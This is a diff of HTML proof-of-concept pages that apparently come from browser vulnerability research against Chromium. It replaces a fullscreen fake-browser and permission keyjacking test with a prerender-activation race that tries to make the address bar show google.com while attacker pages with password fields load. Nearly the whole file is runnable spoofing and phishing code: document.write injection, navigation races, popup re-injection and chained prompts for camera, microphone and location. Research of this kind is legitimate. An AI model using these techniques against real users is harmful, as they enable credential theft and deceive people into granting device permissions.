@@ -1,251 +1,353 @@
 <!DOCTYPE html>
 <html>
 <head>
-<title>PoC 2: Fullscreen + Permission Keyjacking</title>
+<title>PoC 3: Prerender Activation + Navigation Race</title>
 <!--
-  VH-2026-002: Fullscreen + Permission Prompt Keyjacking
+  VH-2026-003: Speculation Rules Prerender Activation Race
 
   Target: Chromium 146+ (Desktop)
 
-  Technique: Chromium's anti-keyjacking defense on permission dialogs
-  uses a ~500ms activation delay. This PoC attempts to bypass it by:
+  Technique: Speculation Rules API allows prerendering pages. When a
+  prerendered page activates (user navigates to it), there's a handoff
+  from the prerendered content to the visible tab. This PoC tests
+  whether we can desynchronize the URL bar from the content during
+  this activation.
 
-  1. Enter fullscreen and render a fake browser UI with an input field
-  2. Encourage the user to type (e.g., fake search box, chat input)
-  3. While user is actively typing, trigger a permission prompt
-  4. Test if the user's ongoing typing/keypresses can interact with
-     the permission dialog before the activation delay expires
+  Attack chain:
+  1. Page A includes speculation rules to prerender a trusted URL
+  2. Page A contains a link that triggers prerender activation
+  3. During activation, attempt to interfere with the navigation:
+     a) Call window.stop() from A before activation completes
+     b) Use document.open() to replace content during handoff
+     c) Navigate away during the activation transition
+     d) Use BFCache to restore a different page state
 
-  Sub-techniques:
-  A) Rapid Enter key during typing -> keyjack the Accept button
-  B) Tab key during typing -> focus the Accept button, then Enter
-  C) Space bar during typing -> activate focused Accept button
-
-  Chromium defense: InputEventActivationProtector with 500ms delay.
-  But this may not account for:
-  - Keys already held down when the dialog appears
-  - Keyboard repeat events from held keys
-  - Platform-specific keyboard behavior (macOS key repeat)
+  The prerender activation path is distinct from regular navigation
+  and may not be covered by the same URL bar update protections.
 -->
 </head>
-<body style="font-family: -apple-system, sans-serif; margin: 0; padding: 40px; background: #f0f0f0;">
+<body style="font-family: -apple-system, sans-serif; padding: 40px; background: #f0f0f0;">
 
-<h2>Fullscreen + Permission Keyjacking</h2>
-<p>Tests whether ongoing keyboard input can interact with permission prompts during the activation delay.</p>
+<h2>Prerender Activation + Navigation Race</h2>
+<p>Tests whether the Speculation Rules prerender activation path can be abused for URL bar desync.</p>
 
 <div style="display: flex; gap: 12px; flex-wrap: wrap; margin: 20px 0;">
-  <button onclick="testEnterKeyjack()" style="padding: 14px 28px; font-size: 15px; cursor: pointer; background: #dc3545; color: #fff; border: none; border-radius: 8px;">
-    A: Enter Key Keyjack
+  <button onclick="testVariantA()" style="padding: 14px 28px; font-size: 15px; cursor: pointer; background: #dc3545; color: #fff; border: none; border-radius: 8px;">
+    A: Prerender + window.stop() Race
   </button>
-  <button onclick="testTabKeyjack()" style="padding: 14px 28px; font-size: 15px; cursor: pointer; background: #fd7e14; color: #fff; border: none; border-radius: 8px;">
-    B: Tab+Enter Keyjack
+  <button onclick="testVariantB()" style="padding: 14px 28px; font-size: 15px; cursor: pointer; background: #007bff; color: #fff; border: none; border-radius: 8px;">
+    B: Prerender + Competing Navigation
   </button>
-  <button onclick="testFullscreenNotification()" style="padding: 14px 28px; font-size: 15px; cursor: pointer; background: #007bff; color: #fff; border: none; border-radius: 8px;">
-    C: Fullscreen Notification Dismiss Race
+  <button onclick="testVariantC()" style="padding: 14px 28px; font-size: 15px; cursor: pointer; background: #28a745; color: #fff; border: none; border-radius: 8px;">
+    C: Prerender + History Manipulation
   </button>
-  <button onclick="testFullscreenMultiDialog()" style="padding: 14px 28px; font-size: 15px; cursor: pointer; background: #6f42c1; color: #fff; border: none; border-radius: 8px;">
-    D: Multi-Dialog Confusion
+  <button onclick="testVariantD()" style="padding: 14px 28px; font-size: 15px; cursor: pointer; background: #6f42c1; color: #fff; border: none; border-radius: 8px;">
+    D: Cross-Origin Prerender Redirect
   </button>
 </div>
 
-<div id="log" style="margin-top: 20px; padding: 16px; background: #1a1a1a; color: #0f0; font-family: monospace; font-size: 13px; border-radius: 8px; max-height: 300px; overflow-y: auto;"></div>
+<div id="log" style="margin-top: 20px; padding: 16px; background: #1a1a1a; color: #0f0; font-family: monospace; font-size: 13px; border-radius: 8px; max-height: 400px; overflow-y: auto;"></div>
+
+<div id="specRulesContainer"></div>
 
 <script>
 function log(msg) {
   const el = document.getElementById('log');
-  if (el) el.innerHTML += `[${new Date().toLocaleTimeString()}] ${msg}<br>`;
+  el.innerHTML += `[${new Date().toLocaleTimeString()}] ${msg}<br>`;
+  el.scrollTop = el.scrollHeight;
 }
 
-// Enter fullscreen and render a fake browser with a text input
-async function enterFakeChrome(callback) {
-  try {
-    await document.documentElement.requestFullscreen();
-  } catch(e) {
-    log('Fullscreen failed: ' + e.message);
-    return;
-  }
+// Inject speculation rules dynamically
+function injectSpeculationRules(urls) {
+  // Remove existing rules
+  document.querySelectorAll('script[type="speculationrules"]').forEach(s => s.remove());
 
-  // Replace body with fake Chrome UI
-  document.body.style.margin = '0';
-  document.body.style.padding = '0';
-  document.body.style.background = '#fff';
-  document.body.innerHTML = `
-    <!-- Fake Chrome toolbar -->
-    <div style="background: #dee1e6; padding: 4px 8px; display: flex; align-items: center; gap: 6px; height: 36px;">
-      <div style="display: flex; gap: 4px; align-items: center;">
-        <div style="width: 12px; height: 12px; border-radius: 50%; background: #ff5f57;"></div>
-        <div style="width: 12px; height: 12px; border-radius: 50%; background: #febc2e;"></div>
-        <div style="width: 12px; height: 12px; border-radius: 50%; background: #28c840;"></div>
-      </div>
-      <div style="flex: 1;"></div>
-    </div>
+  const rules = {
+    prerender: urls.map(url => ({
+      source: "list",
+      urls: [url]
+    }))
+  };
 
-    <!-- Fake tab bar -->
-    <div style="background: #dee1e6; padding: 0 8px; display: flex; align-items: end; height: 32px;">
-      <div style="background: #fff; padding: 6px 16px; border-radius: 8px 8px 0 0; font-size: 12px; color: #5f6368; display: flex; align-items: center; gap: 6px;">
-        <img src="data:image/svg+xml,<svg xmlns='http://www.w3.org/2000/svg' width='16' height='16'><rect fill='%234285f4' width='16' height='16' rx='2'/><text x='8' y='12' text-anchor='middle' fill='white' font-size='10'>G</text></svg>" width="16" height="16">
-        Google
-      </div>
-    </div>
+  const script = document.createElement('script');
+  script.type = 'speculationrules';
+  script.textContent = JSON.stringify(rules);
+  document.getElementById('specRulesContainer').appendChild(script);
+  log('Speculation rules injected for: ' + urls.join(', '));
+}
 
-    <!-- Fake address bar -->
-    <div style="background: #fff; padding: 8px 12px; border-bottom: 1px solid #e0e0e0; display: flex; align-items: center;">
-      <div style="flex: 1; background: #f1f3f4; border-radius: 20px; padding: 8px 16px; display: flex; align-items: center; gap: 8px;">
-        <svg width="16" height="16" fill="#5f6368" viewBox="0 0 24 24">
-          <path d="M18 8h-1V6c0-2.76-2.24-5-5-5S7 3.24 7 6v2H6c-1.1 0-2 .9-2 2v10c0 1.1.9 2 2 2h12c1.1 0 2-.9 2-2V10c0-1.1-.9-2-2-2zM12 17c-1.1 0-2-.9-2-2s.9-2 2-2 2 .9 2 2-.9 2-2 2zm3.1-9H8.9V6c0-1.71 1.39-3.1 3.1-3.1 1.71 0 3.1 1.39 3.1 3.1v2z"/>
-        </svg>
-        <span style="font-size: 14px; color: #202124;">google.com</span>
-      </div>
-    </div>
+// Variant A: Prerender activation + window.stop()
+// Hypothesis: If we prerender a trusted URL, then trigger activation while
+// calling window.stop(), the URL may update to the trusted URL but the
+// content may revert to the current page.
+function testVariantA() {
+  log('[A] Setting up prerender for https://www.google.com/...');
 
-    <!-- Fake Google search page with input -->
-    <div style="text-align: center; padding: 80px 20px;">
-      <div style="font-size: 92px; margin-bottom: 30px;">
-        <span style="color: #4285f4;">G</span><span style="color: #ea4335;">o</span><span style="color: #fbbc05;">o</span><span style="color: #4285f4;">g</span><span style="color: #34a853;">l</span><span style="color: #ea4335;">e</span>
-      </div>
-      <div style="max-width: 580px; margin: 0 auto;">
-        <input id="fakeSearch" type="text" autofocus
-               placeholder="Search Google or type a URL"
-               style="width: 100%; padding: 14px 20px; font-size: 16px; border: 1px solid #dfe1e5; border-radius: 24px; outline: none; box-sizing: border-box;"
-               onkeydown="handleKey(event)">
-        <div style="margin-top: 20px; display: flex; gap: 12px; justify-content: center;">
-          <button style="padding: 10px 16px; background: #f8f9fa; border: 1px solid #f8f9fa; border-radius: 4px; font-size: 14px; color: #3c4043; cursor: pointer;">Google Search</button>
-          <button style="padding: 10px 16px; background: #f8f9fa; border: 1px solid #f8f9fa; border-radius: 4px; font-size: 14px; color: #3c4043; cursor: pointer;">I'm Feeling Lucky</button>
-        </div>
-      </div>
-    </div>
+  // Step 1: Add speculation rules
+  injectSpeculationRules(['https://www.google.com/']);
+
+  // Step 2: Create a link that will trigger prerender activation
+  const container = document.createElement('div');
+  container.style.cssText = 'margin: 20px 0; padding: 20px; background: #fff; border-radius: 8px;';
+  container.innerHTML = `
+    <p><strong>Step 1:</strong> Wait 2 seconds for prerender to start</p>
+    <p><strong>Step 2:</strong> Click the link below</p>
+    <a id="prerenderLink" href="https://www.google.com/"
+       style="color: #1a73e8; font-size: 18px; text-decoration: underline; cursor: pointer;">
+      Go to Google.com (prerendered)
+    </a>
+    <p id="status" style="color: #5f6368; margin-top: 8px;">Waiting...</p>
   `;
+  document.body.appendChild(container);
 
-  // Focus the fake search input
-  setTimeout(() => {
-    const input = document.getElementById('fakeSearch');
-    if (input) input.focus();
-    if (callback) callback();
-  }, 100);
-}
+  // Step 3: Intercept the click to race window.stop()
+  document.getElementById('prerenderLink').addEventListener('click', (e) => {
+    log('[A] Link clicked - prerender activation starting');
 
-let keyCount = 0;
-let permissionTriggered = false;
+    // Don't prevent default - let the navigation happen
+    // But immediately try to stop it and inject content
 
-function handleKey(e) {
-  keyCount++;
-  // After user has typed several characters, trigger permission
-  if (keyCount >= 5 && !permissionTriggered) {
-    permissionTriggered = true;
-    triggerPermission();
-  }
-}
-
-function triggerPermission() {
-  // Trigger geolocation permission after the user is actively typing
-  // The hypothesis: user's ongoing keypresses may hit the dialog
-  navigator.geolocation.getCurrentPosition(
-    () => { /* granted */ },
-    () => { /* denied */ }
-  );
-}
-
-// Variant A: Enter key keyjacking
-function testEnterKeyjack() {
-  log('[A] Entering fullscreen with fake Chrome UI...');
-  log('[A] Type something in the search box, then rapidly hit Enter');
-  log('[A] After 5 keystrokes, a permission prompt will appear');
-  log('[A] CHECK: Does the Enter key interact with the permission prompt?');
-
-  keyCount = 0;
-  permissionTriggered = false;
-  enterFakeChrome();
-}
-
-// Variant B: Tab keyjacking
-function testTabKeyjack() {
-  log('[B] Similar to A, but tests Tab key focus behavior');
-  log('[B] Type in the search box, permission prompt appears');
-  log('[B] CHECK: Does Tab key move focus to the permission dialog?');
-
-  keyCount = 0;
-  permissionTriggered = false;
-  enterFakeChrome();
-}
-
-// Variant C: Race the fullscreen notification dismiss
-// When entering fullscreen, Chrome shows "Press Esc to exit full screen"
-// If we trigger a permission prompt WHILE the notification is visible,
-// the Esc key press intended to exit fullscreen might interact with the prompt
-function testFullscreenNotification() {
-  log('[C] Testing fullscreen notification + permission race...');
-  log('[C] Enter fullscreen -> immediately trigger permission');
-  log('[C] The "Press Esc to exit" notification competes with the permission bubble');
-
-  document.documentElement.requestFullscreen().then(() => {
-    // Immediately trigger permission prompt
-    // This races with the fullscreen notification
-    setTimeout(() => {
-      log('[C] Triggering permission during fullscreen notification...');
-      navigator.geolocation.getCurrentPosition(
-        () => log('[C] Geolocation GRANTED'),
-        () => log('[C] Geolocation denied')
-      );
-    }, 50); // Very small delay - notification should still be visible
-
-    // Also trigger notification permission
-    setTimeout(() => {
-      Notification.requestPermission().then(p => {
-        log('[C] Notification permission: ' + p);
-      });
-    }, 100);
-
-    log('[C] CHECK: Are both the fullscreen notification and permission prompt visible?');
-    log('[C] CHECK: Does the fullscreen notification overlay the permission prompt?');
-    log('[C] CHECK: Is the permission prompt origin visible?');
-  }).catch(e => log('[C] Error: ' + e.message));
-}
-
-// Variant D: Multiple dialogs to create confusion
-// Rapidly trigger multiple permission prompts and JS dialogs
-// to overwhelm the user and cause them to click through
-function testFullscreenMultiDialog() {
-  log('[D] Testing multi-dialog confusion in fullscreen...');
-
-  document.documentElement.requestFullscreen().then(() => {
-    // Render fake Chrome UI
-    document.body.style.margin = '0';
-    document.body.innerHTML = `
-      <div style="background: #fff; height: 100vh; display: flex; align-items: center; justify-content: center;">
-        <div style="text-align: center;">
-          <h1 style="color: #202124;">Loading secure content...</h1>
-          <div style="width: 40px; height: 40px; border: 3px solid #1a73e8; border-top-color: transparent; border-radius: 50%; animation: spin 1s linear infinite; margin: 20px auto;"></div>
-          <p style="color: #5f6368;">Please wait while we verify your identity</p>
-        </div>
-      </div>
-      <style>@keyframes spin { to { transform: rotate(360deg); } }</style>
-    `;
-
-    // Chain of permission requests with varying delays
-    // Goal: user gets fatigued and clicks "Allow" on one
-    const delays = [500, 1200, 2000, 3500];
-    const permissions = [
-      () => navigator.geolocation.getCurrentPosition(() => log('[D] Geo GRANTED'), () => {}),
-      () => Notification.requestPermission().then(p => log('[D] Notif: ' + p)),
-      () => navigator.mediaDevices.getUserMedia({video: true}).then(() => log('[D] Camera GRANTED')).catch(() => {}),
-      () => navigator.mediaDevices.getUserMedia({audio: true}).then(() => log('[D] Mic GRANTED')).catch(() => {}),
-    ];
-
-    delays.forEach((delay, i) => {
+    // Race 1: window.stop() at various timings
+    [0, 1, 2, 5, 10, 20, 50].forEach(delay => {
       setTimeout(() => {
-        if (i < permissions.length) {
-          log('[D] Triggering permission ' + (i + 1) + '...');
-          permissions[i]();
+        try {
+          window.stop();
+          log(`[A] window.stop() at ${delay}ms`);
+        } catch(err) {
+          // Expected if navigation already committed
         }
       }, delay);
     });
 
-    log('[D] Multiple permission prompts will appear in sequence');
-    log('[D] CHECK: How does Chrome handle rapid permission requests in fullscreen?');
-    log('[D] CHECK: Is the origin visible for each prompt?');
-    log('[D] CHECK: Can the user easily distinguish and respond to each?');
+    // Race 2: document.open() at various timings
+    [0, 1, 5, 10, 20].forEach(delay => {
+      setTimeout(() => {
+        try {
+          document.open();
+          document.write(`
+            <html><head><title>Google</title></head>
+            <body style="font-family:Arial;padding:40px;">
+              <h1>Fake Google - injected at ${delay}ms</h1>
+              <p>If URL bar shows google.com = BUG</p>
+              <input type="text" placeholder="Enter password" style="padding:10px;width:300px;">
+            </body></html>
+          `);
+          document.close();
+          log(`[A] document.open() succeeded at ${delay}ms!`);
+        } catch(err) {
+          // Expected
+        }
+      }, delay);
+    });
+  });
 
-  }).catch(e => log('[D] Error: ' + e.message));
+  // Give prerender time to start
+  setTimeout(() => {
+    document.getElementById('status').textContent = 'Prerender should be active. Click the link.';
+    document.getElementById('status').style.color = '#28a745';
+    log('[A] Prerender should be active now');
+  }, 2000);
+}
+
+// Variant B: Trigger prerender activation while simultaneously navigating elsewhere
+// The two navigations compete - prerender activation vs. new navigation
+// The URL bar may show the prerender URL while the other navigation loads
+function testVariantB() {
+  log('[B] Setting up competing navigation during prerender activation...');
+
+  injectSpeculationRules(['https://www.google.com/']);
+
+  const container = document.createElement('div');
+  container.style.cssText = 'margin: 20px 0; padding: 20px; background: #fff; border-radius: 8px;';
+  container.innerHTML = `
+    <p>Click the link. While prerender activates, a competing navigation fires.</p>
+    <a id="prerenderLinkB" href="https://www.google.com/"
+       style="color: #1a73e8; font-size: 18px;">Go to Google.com</a>
+  `;
+  document.body.appendChild(container);
+
+  document.getElementById('prerenderLinkB').addEventListener('click', (e) => {
+    log('[B] Prerender activation triggered');
+
+    // Immediately fire a competing navigation
+    setTimeout(() => {
+      try {
+        // Form submission to a different URL (different navigation path)
+        const form = document.createElement('form');
+        form.method = 'GET';
+        form.action = 'about:blank';
+        document.body.appendChild(form);
+        form.submit();
+        log('[B] Competing form submission fired');
+      } catch(err) {
+        log('[B] Form submit error: ' + err.message);
+      }
+    }, 0);
+
+    // Also try location.replace which is yet another navigation path
+    setTimeout(() => {
+      try {
+        // Create a blob with attacker content
+        const blob = new Blob([`
+          <html><head><title>Google</title></head>
+          <body><h1>Content controlled by attacker</h1>
+          <p>Check URL bar</p></body></html>
+        `], {type: 'text/html'});
+        const url = URL.createObjectURL(blob);
+        location.replace(url);
+        log('[B] location.replace to blob URL fired');
+      } catch(err) {
+        log('[B] Replace error: ' + err.message);
+      }
+    }, 1);
+  });
+
+  setTimeout(() => log('[B] Ready - click the link'), 2000);
+}
+
+// Variant C: Prerender + history.pushState during activation
+// When prerender activates, the session history is modified.
+// What if we pushState during this modification?
+function testVariantC() {
+  log('[C] Testing history manipulation during prerender activation...');
+
+  injectSpeculationRules(['https://www.google.com/']);
+
+  // Set up a history stack
+  history.pushState({page: 1}, '', '/page1');
+  history.pushState({page: 2}, '', '/page2');
+  history.pushState({page: 3}, '', '/page3');
+  log('[C] History stack: /page1, /page2, /page3');
+
+  const container = document.createElement('div');
+  container.style.cssText = 'margin: 20px 0; padding: 20px; background: #fff; border-radius: 8px;';
+  container.innerHTML = `
+    <p>Click to activate prerender while history is manipulated.</p>
+    <a id="prerenderLinkC" href="https://www.google.com/"
+       style="color: #1a73e8; font-size: 18px;">Go to Google.com</a>
+  `;
+  document.body.appendChild(container);
+
+  document.getElementById('prerenderLinkC').addEventListener('click', (e) => {
+    log('[C] Prerender activation + history manipulation');
+
+    // While prerender activates, go back in history
+    [0, 1, 2, 5].forEach(delay => {
+      setTimeout(() => {
+        try {
+          history.go(-1);
+          log(`[C] history.go(-1) at ${delay}ms`);
+        } catch(err) {}
+      }, delay);
+    });
+
+    // Also try pushState during activation
+    [0, 1, 5, 10].forEach(delay => {
+      setTimeout(() => {
+        try {
+          history.pushState({spoofed: true}, '', 'https://www.google.com/search?q=test');
+          log(`[C] pushState to google.com/search at ${delay}ms`);
+        } catch(err) {
+          // SecurityError expected for cross-origin pushState
+          log(`[C] pushState failed at ${delay}ms: ${err.message}`);
+        }
+      }, delay);
+    });
+  });
+
+  setTimeout(() => log('[C] Ready - click the link'), 2000);
+}
+
+// Variant D: Prerender with cross-origin redirect
+// Prerender URL A, which redirects to URL B. During the redirect,
+// the URL bar state may be inconsistent.
+function testVariantD() {
+  log('[D] Testing prerender with redirect chain...');
+  log('[D] NOTE: Requires server.js for redirect endpoints');
+  log('[D] Using open redirects on known sites as alternative');
+
+  // Some sites have open redirect endpoints that could be used:
+  // This tests whether prerender follows redirects and how the URL bar updates
+
+  // Use a data URL that does a meta refresh as a redirect simulation
+  const redirectPage = 'data:text/html,' + encodeURIComponent(`
+    <html><head>
+    <meta http-equiv="refresh" content="0;url=https://www.google.com/">
+    </head><body>Redirecting...</body></html>
+  `);
+
+  // Note: data: URLs can't be prerendered, but blob: URLs might work
+  const blob = new Blob([`
+    <html><head>
+    <script>location.replace('https://www.google.com/');<\/script>
+    </head><body>Redirecting...</body></html>
+  `], {type: 'text/html'});
+  const blobUrl = URL.createObjectURL(blob);
+
+  log('[D] Blob URL with redirect: ' + blobUrl);
+
+  // Try prerendering the blob URL (may not be allowed)
+  injectSpeculationRules([blobUrl]);
+
+  const container = document.createElement('div');
+  container.style.cssText = 'margin: 20px 0; padding: 20px; background: #fff; border-radius: 8px;';
+  container.innerHTML = `
+    <p>Tests prerender behavior with redirect chains.</p>
+    <a href="${blobUrl}" style="color: #1a73e8; font-size: 18px;">Activate prerendered redirect</a>
+    <br><br>
+    <p>Alternative: manual redirect chain test</p>
+    <button onclick="testRedirectChain()" style="padding: 10px 20px; cursor: pointer;">
+      Test Redirect Chain Navigation
+    </button>
+  `;
+  document.body.appendChild(container);
+
+  setTimeout(() => log('[D] Ready'), 2000);
+}
+
+// Test rapid redirect chain navigation
+function testRedirectChain() {
+  log('[D] Opening popup with redirect chain...');
+
+  const popup = window.open('about:blank');
+  if (!popup) { log('[D] Popup blocked'); return; }
+
+  // Write content to the popup
+  popup.document.open();
+  popup.document.write(`
+    <html><head><title>Loading Google...</title></head>
+    <body style="font-family:Arial;padding:40px;">
+      <h2>Redirecting to Google...</h2>
+      <div id="content">
+        <input type="email" placeholder="Email" style="width:300px;padding:10px;display:block;margin:8px 0;">
+        <input type="password" placeholder="Password" style="width:300px;padding:10px;display:block;margin:8px 0;">
+        <button>Sign In</button>
+      </div>
+    </body></html>
+  `);
+  popup.document.close();
+
+  // Navigate popup to google.com
+  setTimeout(() => {
+    popup.location.href = 'https://www.google.com/';
+    log('[D] Navigation to google.com initiated');
+
+    // Race: try to stop and re-inject
+    [1, 5, 10, 50, 100].forEach(delay => {
+      setTimeout(() => {
+        try {
+          popup.stop();
+          popup.document.open();
+          popup.document.write(`
+            <html><head><title>Google</title></head>
+            <body><h1>SPOOFED at ${delay}ms</h1><p>Check URL bar</p></body></html>
+          `);
+          popup.document.close();
+          log(`[D] Content re-injected at ${delay}ms`);
+        } catch(e) {}
+      }, delay);
+    });
+  }, 200);
 }
 </script>
 </body>
